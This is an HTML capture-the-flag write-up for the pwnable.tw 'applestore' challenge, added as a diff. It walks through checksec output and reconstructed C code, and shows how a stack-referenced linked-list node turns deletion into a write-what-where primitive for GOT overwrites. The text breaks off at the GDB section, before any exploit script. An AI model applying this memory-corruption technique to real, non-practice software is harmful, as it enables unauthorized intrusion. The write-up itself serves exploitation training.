@@ -1,0 +1,1468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>applestore | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F34E;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 700px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">applestore</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>applestore</h1>
+  <p class="hero-subtitle">"tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!" &mdash; Exploiting a stack-referenced linked list node to leak libc, compute stack addresses via environ, and overwrite the GOT through a crafted delete operation.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">200 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Stack Reference in Linked List</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10104</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">applestore (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Points</td><td class="value">200</td></tr>
+        <tr><td class="label">Description</td><td class="value">"tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!"</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec applestore
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Partial RELRO</td><td class="partial">GOT is writable &mdash; we can overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated &mdash; must find another path</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode injection &mdash; must redirect code execution</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are fixed &mdash; known GOT/PLT addresses</td></tr>
+      </table>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./applestore
+&lt;=====  Apple Store  =====&gt;
+1: Add
+2: Remove
+3: Cart
+4: Checkout
+5: Exit
+&gt;1
+Device:1
+Amount:2
+&lt;=====  Apple Store  =====&gt;
+1: Add
+2: Remove
+3: Cart
+4: Checkout
+5: Exit
+&gt;3
+1: iPhone 6 - $199, 2
+2: iPhone 6 Plus - $299, 0
+3: iPad Air 2 - $499, 0
+4: iPad Mini 3 - $399, 0
+5: iPod Touch - $399, 0
+Total: $398</code></pre>
+      </div>
+
+      <p>The binary presents an Apple Store shopping cart system. You can add devices, remove them, view the cart, and checkout. The key feature is that the cart is implemented as a <strong>doubly-linked list</strong> of items on the heap &mdash; but the <code class="inline">checkout</code> function introduces a critical bug that places an item on the <strong>stack</strong>.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Cart Item Structure</h3>
+      <p>Each cart item is a 16-byte doubly-linked list node allocated on the heap:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">struct cart_item {
+    char* name;           // +0x00: pointer to item name string (4 bytes)
+    int price;            // +0x04: item price (4 bytes)
+    cart_item* next;      // +0x08: pointer to next item (4 bytes)
+    cart_item* prev;      // +0x0c: pointer to prev item (4 bytes)
+};
+
+// Global head of linked list
+cart_item* myCart = NULL;</code></pre>
+      </div>
+
+      <h3>add() &mdash; Adding Items to Cart</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void add() {
+    printf("Device:");
+    read(0, device_choice, 16);
+    printf("Amount:");
+    read(0, amount_str, 16);
+    amount = atoi(amount_str);
+
+    for (int i = 0; i &lt; amount; i++) {
+        // Allocate on the HEAP
+        cart_item* item = (cart_item*)malloc(16);
+        item-&gt;name  = device_names[choice];
+        item-&gt;price = device_prices[choice];
+        insert(item);   // inserts into doubly-linked list
+    }
+}
+
+void insert(cart_item* item) {
+    cart_item* curr = myCart;
+    if (curr == NULL) {
+        myCart = item;
+        item-&gt;prev = NULL;
+        item-&gt;next = NULL;
+    } else {
+        while (curr-&gt;next != NULL)
+            curr = curr-&gt;next;
+        curr-&gt;next = item;
+        item-&gt;prev = curr;
+        item-&gt;next = NULL;
+    }
+}</code></pre>
+      </div>
+
+      <p>Normal items are allocated via <code class="inline">malloc(16)</code> on the heap. The linked list is maintained with proper <code class="inline">prev</code>/<code class="inline">next</code> pointers. Nothing unusual here &mdash; the vulnerability lies in the <code class="inline">checkout</code> function.</p>
+
+      <h3>checkout() &mdash; The Vulnerable Function</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void checkout() {
+    int total = cart();  // sums up all item prices
+
+    if (total == 0x1c06) {     // 7174 decimal!
+        puts("*: iPhone 8 - $1");
+
+        // BUG: 'item' is a LOCAL STACK variable!
+        cart_item item;
+        asprintf((char**)&amp;item.name, "%s", "iPhone 8");
+        item.price = 1;
+        insert(&amp;item);        // adds STACK address to linked list!
+
+        total = 0x1c07;        // update total to 7175
+    }
+
+    printf("Total: $%d\n", total);
+    puts("Want to checkout? Maybe next time!");
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Stack-Referenced Linked List Node</div>
+        When the cart total equals exactly <strong>7174 (0x1c06)</strong>, an "iPhone 8" item is created as a <strong>local stack variable</strong> inside <code class="inline">checkout()</code>. The <code class="inline">insert(&amp;item)</code> call adds a <strong>pointer to this stack frame</strong> into the global linked list.<br><br>
+        Since <code class="inline">handler()</code> loops back to the main menu after <code class="inline">checkout()</code> returns, the stack frame is reused by subsequent function calls. The stack memory where the iPhone 8 item lived now <strong>overlaps with input buffers</strong> in later calls to <code class="inline">cart()</code> and <code class="inline">delete()</code>!<br><br>
+        &bull; The linked list still contains a pointer to the <strong>freed stack region</strong><br>
+        &bull; Subsequent function calls reuse that stack space, letting us <strong>write controlled data</strong> over the old item fields<br>
+        &bull; We can control the <code class="inline">name</code>, <code class="inline">price</code>, <code class="inline">next</code>, and <code class="inline">prev</code> pointers of the iPhone 8 item
+      </div>
+
+      <h3>delete() &mdash; The Exploitation Primitive</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-header">
+            <span class="code-lang">c</span>
+            <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+          </div>
+        </div>
+        <pre><code class="language-c">void delete() {
+    printf("Item Number:");
+    read(0, input, 16);
+
+    // Parse input and find item at that index
+    cart_item* target = find_item(atoi(input));
+
+    if (target != NULL) {
+        // Doubly-linked list removal
+        if (target-&gt;prev != NULL)
+            target-&gt;prev-&gt;next = target-&gt;next;
+        else
+            myCart = target-&gt;next;
+
+        if (target-&gt;next != NULL)
+            target-&gt;next-&gt;prev = target-&gt;prev;
+
+        // NOTE: no free() here for stack-allocated item!
+        // For heap items, this leaks memory but is not the bug.
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Exploitation Primitive</div>
+        The <code class="inline">delete()</code> function performs a standard doubly-linked list removal: it writes to <code class="inline">target-&gt;prev-&gt;next</code> and <code class="inline">target-&gt;next-&gt;prev</code>.<br><br>
+        Since we can <strong>overwrite the iPhone 8's <code class="inline">prev</code> and <code class="inline">next</code> pointers</strong> via the stack overlap, deleting the iPhone 8 becomes a <strong>write-what-where primitive</strong>:<br>
+        &bull; <code class="inline">target-&gt;prev-&gt;next = target-&gt;next</code> &rarr; writes <code class="inline">target-&gt;next</code> to the address at <code class="inline">target-&gt;prev + 8</code><br>
+        &bull; <code class="inline">target-&gt;next-&gt;prev = target-&gt;prev</code> &rarr; writes <code class="inline">target-&gt;prev</code> to the address at <code class="inline">target-&gt;next + 12</code><br><br>
+        By carefully choosing <code class="inline">prev</code> and <code class="inline">next</code>, we can <strong>write an arbitrary value to an arbitrary address</strong>!
+      </div>
+
+      <h3>handler() &mdash; The Loop That Enables Exploitation</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void handler() {
+    while (1) {
+        print_menu();
+        printf("&gt;");
+        read(0, choice, 16);
+
+        switch (atoi(choice)) {
+            case 1: add();     break;
+            case 2: delete();  break;
+            case 3: cart();    break;
+            case 4: checkout();break;
+            case 5: exit(0);   break;
+        }
+        // After checkout() returns, the stack is reused!
+        // The iPhone 8 item's memory now belongs to
+        // local variables of the NEXT function call.
+    }
+}</code></pre>
+      </div>
+
+      <p>The key insight is that <code class="inline">handler()</code> is always on the call stack. When <code class="inline">checkout()</code> returns, its stack frame is popped, but the iPhone 8's <strong>address was already inserted</strong> into the linked list. The next call to <code class="inline">cart()</code> or <code class="inline">delete()</code> reuses that same stack space, and their local variables <strong>overlap</strong> with the iPhone 8 item's memory.</p>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Building the Cart to 7174</h3>
+      <p>First, we need to find a combination of items that totals exactly 7174:</p>
+
+      <table class="info-table">
+        <tr><th>Item</th><th>Price</th><th>Qty</th><th>Subtotal</th></tr>
+        <tr><td>iPhone 6</td><td>$199</td><td>19</td><td>$3781</td></tr>
+        <tr><td>iPad Air 2</td><td>$499</td><td>6</td><td>$2994</td></tr>
+        <tr><td>iPad Mini 3</td><td>$399</td><td>1</td><td>$399</td></tr>
+        <tr><td colspan="3" style="text-align:right;font-weight:700;color:var(--fg)">Total</td><td style="color:var(--green);font-weight:700">$7174 = 0x1c06</td></tr>
+      </table>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Cart Verification</div>
+        19 &times; 199 = 3781, 6 &times; 499 = 2994, 1 &times; 399 = 399. Total = 3781 + 2994 + 399 = 7174 = <code class="inline">0x1c06</code>. This triggers the secret iPhone 8 checkout!
+      </div>
+
+      <h3>Stack Frame Overlap After Checkout</h3>
+      <p>After calling <code class="inline">checkout()</code> and obtaining the iPhone 8 at index 27, let's examine the stack overlap:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
